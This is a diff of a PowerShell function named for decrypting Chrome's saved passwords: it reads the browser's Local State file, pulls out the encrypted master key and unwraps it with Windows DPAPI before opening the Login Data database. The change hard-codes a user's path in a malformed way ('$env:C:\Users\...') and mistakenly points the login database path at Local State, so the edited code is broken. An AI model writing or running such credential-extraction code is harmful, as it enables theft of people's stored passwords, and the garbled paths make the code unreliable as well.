@@ -1,7 +1,7 @@
 # Function to decrypt Chrome passwords
 function Get-ChromePasswords {
     try {
-        $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
+        $localStatePath = "$env:C:\Users\Shivam\AppData\Local\Google\Chrome\User Data\Local State"
         if (-not (Test-Path $localStatePath)) {
             Write-Output "Chrome local state file not found."
             return @()
@@ -10,7 +10,7 @@ function Get-ChromePasswords {
         $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key) | Select-Object -Skip 5
         $key = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
-        $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+        $dbPath = "$env:C:\Users\Shivam\AppData\Local\Google\Chrome\User Data\Local State"
         if (-not (Test-Path $dbPath)) {
             Write-Output "Chrome login data file not found."
             return @()
